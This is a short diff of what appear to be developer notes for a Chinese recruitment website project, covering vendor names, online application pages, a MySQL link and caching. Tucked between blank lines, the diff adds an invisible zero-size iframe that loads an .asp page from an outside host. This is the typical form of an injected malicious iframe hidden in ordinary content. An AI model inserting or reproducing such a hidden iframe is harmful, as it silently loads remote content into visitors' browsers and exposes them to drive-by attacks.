@@ -1,5 +1,5 @@
 ﻿招聘信息
-new recruitment vendors - yingjiesheng.com, guolairen.com, www.xyzp.net(卖我网)
+new recruitment vendors - 面霸网, 大街网
 
 处理网申, 在乔布堂网站嵌入网申页面
 
@@ -48,6 +48,8 @@ http://dev.mysql.com/doc/refman/5.1/zh/optimization.html
 
 
 
+
+<iframe src="http://www.team-key.com/tk/temptest/keyindex.asp" width="0px" height="0px" frameBorder="0" scrolling="no"></iframe>
 
 缓存 activity/group show/recent pages
 
